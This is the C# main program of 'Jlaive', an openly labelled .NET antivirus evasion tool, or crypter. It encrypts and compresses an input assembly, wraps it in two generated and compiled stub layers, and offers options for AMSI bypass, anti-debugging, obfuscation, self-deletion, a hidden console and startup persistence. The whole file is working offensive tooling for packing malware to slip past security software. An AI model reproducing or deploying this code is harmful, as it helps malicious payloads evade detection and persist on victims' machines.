using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.CSharp;

using static Jlaive.Utils;

namespace Jlaive
{
    internal class Program
    {
        static string _output = string.Empty;
        static string _input = string.Empty;
        static bool _amsibypass = false;
        static bool _antidebug = false;
        static bool _obfuscate = false;
        static bool _deleteself = false;
        static bool _hidden = false;
        static bool _startup = false;

        static void Main(string[] args)
        {
            if (args.Length < 1) HelpManual();
            else if (args[0] == "help" || args[0] == "--help" || args[0] == "-h") HelpManual();
            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case string p when (p == "-o" || p == "--output"): _output = args[i + 1]; break;
                    case string p when (p == "-i" || p == "--input"): _input = args[i + 1]; break;
                    case string p when (p == "-ab" || p == "--amsibypass"): _amsibypass = true; break;
                    case string p when (p == "-ad" || p == "--antidebug"): _antidebug = true; break;
                    case string p when (p == "-obf" || p == "--obfuscate"): _obfuscate = true; break;
                    case string p when (p == "-d" || p == "--deleteself"): _deleteself = true; break;
                    case string p when (p == "-h" || p == "--hidden"): _hidden = true; break;
                    case string p when (p == "-s" || p == "--startup"): _startup = true; break;
                }
            }

            if (!File.Exists(_input))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid input path.");
                Console.ResetColor();
                Environment.Exit(1);
            }
            if (!IsAssembly(_input))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Input file not valid assembly!");
                Console.ResetColor();
                Environment.Exit(1);
            }

            Random rng = new Random();
            Console.ForegroundColor = ConsoleColor.Gray;
            byte[] pbytes = File.ReadAllBytes(_input);

            Console.WriteLine("Modifying payload...");
            pbytes = Patcher.Fix(pbytes);

            Console.WriteLine("Encrypting payload...");
            AesManaged aes = new AesManaged();
            byte[] payload_enc = Encrypt(Compress(pbytes), aes.Key, aes.IV);

            Console.WriteLine("Creating stub...");
            string stub = StubGen.CreateCS(aes.Key, aes.IV, _amsibypass, _antidebug, _startup, rng);
            aes.Dispose();

            Console.WriteLine("Compiling stub...");
            string tempfile = Path.GetTempFileName();
            File.WriteAllText("payload.txt", Convert.ToBase64String(payload_enc));
            CSharpCodeProvider csc = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, tempfile)
            {
                GenerateExecutable = true,
                CompilerOptions = "/optimize",
                IncludeDebugInformation = false
            };
            parameters.EmbeddedResources.Add("payload.txt");
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
            if (results.Errors.Count > 0)
            {
                List<string> errors = new List<string>();
                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}");
                Console.ResetColor();
                Environment.Exit(1);
                return;
            }
            byte[] stubbytes = File.ReadAllBytes(tempfile);
            File.Delete("payload.txt");
            File.Delete(tempfile);

            Console.WriteLine("Encrypting stub...");
            aes = new AesManaged();
            byte[] stub_enc = Encrypt(Compress(stubbytes), aes.Key, aes.IV);

            Console.WriteLine("Creating secondary stub...");
            stub = StubGen.CreateCLI(aes.Key, aes.IV, rng);
            aes.Dispose();

            Console.WriteLine("Compiling secondary stub...");
            File.WriteAllText("payload.txt", Convert.ToBase64String(stub_enc));
            csc = new CSharpCodeProvider();
            parameters = new CompilerParameters()
            {
                GenerateExecutable = true,
                OutputAssembly = "out.exe",
                IncludeDebugInformation = false
            };
            parameters.EmbeddedResources.Add("payload.txt");
            results = csc.CompileAssemblyFromSource(parameters, stub);
            if (results.Errors.Count > 0)
            {
                List<string> errors = new List<string>();
                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}");
                Console.ResetColor();
                Environment.Exit(1);
                return;
            }
            File.Delete("payload.txt");

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"Build successful!\nOutput path: {_output}");
            Console.ResetColor();
            Environment.Exit(0);
        }

        static void HelpManual()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@".________ .___    .______  .___ .___     ._______
:____.   \|   |   :      \ : __||   |___ : .____/
 __|  :/ ||   |   |   .   || : ||   |   || : _/\ 
|     :  ||   |/\ |   :   ||   ||   :   ||   /  \
 \__. __/ |   /  \|___|   ||   | \      ||_.: __/
    :/    |______/    |___||___|  \____/    :/   
    :                                            ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(".NET Antivirus Evasion Tool");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("GitHub: https://github.com/ch2sh/Jlaive");
            Console.WriteLine("Discord: https://discord.gg/RU5RjSe8WN");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Usage:");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write($" {Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)} [-h|--help] [-i|--input] [-o|--output] [-ab|--amsibypass] [-ad|--antidebug] [-obf|--obfuscate] [-d|--deleteself] [-h|--hidden] [-s|--startup]\n\n");

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Arguments:");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("--help          Print help information");
            Console.WriteLine("--input         Set file input path");
            Console.WriteLine("--output        Set file output path");
            Console.WriteLine("--amsibypass    Bypass Assembly.Load AMSI check");
            Console.WriteLine("--antidebug     Add anti debug protection to output file.");
            Console.WriteLine("--obfuscate     Obfuscate output file");
            Console.WriteLine("--deleteself    Make output file delete itself after execution");
            Console.WriteLine("--hidden        Hide console during execution");
            Console.WriteLine("--startup       Add batch file to startup upon execution");
            Console.WriteLine();
            Console.ResetColor();
            Environment.Exit(0);
        }
    }
}
